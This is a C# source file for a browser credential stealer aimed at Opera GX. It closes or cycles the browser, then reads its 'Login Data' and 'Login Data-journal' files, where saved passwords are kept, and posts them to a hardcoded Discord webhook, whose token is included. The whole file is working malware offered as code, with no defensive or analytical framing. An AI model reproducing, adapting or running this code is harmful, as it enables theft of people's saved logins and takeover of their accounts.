using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Net.Http;
using System.Security.AccessControl;
using System.Reflection.Metadata;
/////////////////////////////////
using Main;

namespace OperaGXEX
{
    public class OperaGX
    {
        public async Task Start()
        {
            //OperaGX Check ob es Geschlossen ist

            static bool IsOperaGXRunning()
            {
                Process[] processes = Process.GetProcessesByName("Opera GX Internet Browser");
                return processes.Length > 0;
            }

            if (IsOperaGXRunning())
            {
                Console.WriteLine("OperaGX is running. Closing OperaGX...");
                Thread.Sleep(5000);
                CloseOperaGX();
                Thread.Sleep(2000);
            }
            else
            {
                Console.WriteLine("OperaGX is not running. Opening OperaGX...");
                OpenOperaGX();
                Thread.Sleep(6000);
                Console.WriteLine("Closing OperaGX...");
                CloseOperaGX();
                Thread.Sleep(2000);
            }

            static void CloseOperaGX()
            {
                string directoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "Opera GX");

                string[] fileNames = Directory.GetFiles(directoryPath, "*", SearchOption.TopDirectoryOnly)
                    .Where(file => file.EndsWith("launcher", StringComparison.OrdinalIgnoreCase) ||
                                   file.EndsWith("opera", StringComparison.OrdinalIgnoreCase) ||
                                   file.EndsWith("launcher.exe", StringComparison.OrdinalIgnoreCase) ||
                                   file.EndsWith("opera.exe", StringComparison.OrdinalIgnoreCase))
                    .ToArray();

                foreach (string fileName in fileNames)
                {
                    // Try to kill the process that has this file name as the process name
                    string processName = Path.GetFileNameWithoutExtension(fileName);
                    Process[] processes = Process.GetProcessesByName(processName);
                    foreach (Process process in processes)
                    {
                        process.Kill();
                    }
                }
            }

            static void OpenOperaGX()
            {
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string operaGXPath = Path.Combine(appDataPath, @"Programs\Opera GX");

                string[] launcherFiles = Directory.GetFiles(operaGXPath, "opera.exe", SearchOption.AllDirectories);
                if (launcherFiles.Length > 0)
                {
                    string launcherPath = launcherFiles[0];
                    Process.Start(launcherPath);
                }
            }

            //SEND
            string operaDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera GX Stable";
            string loginDataPath = Path.Combine(operaDirectory, "Login Data");
            string loginDataJournalPath = Path.Combine(operaDirectory, "Login Data-journal");

            if (File.Exists(loginDataPath) && File.Exists(loginDataJournalPath))
            {
                using (var httpClient = new HttpClient())
                {
                    using (var multipartFormDataContent = new MultipartFormDataContent())
                    {
                        using (var fileStream = new FileStream(loginDataPath, FileMode.Open, FileAccess.Read))
                        using (var journalFileStream = new FileStream(loginDataJournalPath, FileMode.Open, FileAccess.Read))
                        {
                            multipartFormDataContent.Add(new StreamContent(fileStream), "files", "Login Data");
                            multipartFormDataContent.Add(new StreamContent(journalFileStream), "files", "Login Data-journal");

                            var response = await httpClient.PostAsync("https://discord.com/api/webhooks/1101951462344499292/wdsO702hdrfl08Zcw0CYxUfyZ12CyTsiRn8ll3mWf9mlpEY3Ar8CR0Cmo5nInSZ_ADZp", multipartFormDataContent);

                            if (response.IsSuccessStatusCode)
                            {
                                Console.WriteLine("Files sent successfully.");
                            }
                            else
                            {
                                Console.WriteLine("Failed to send files. Response status code: " + response.StatusCode);
                            }
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("Files not found.");
            }


            Console.ReadLine();
        }
    }
}
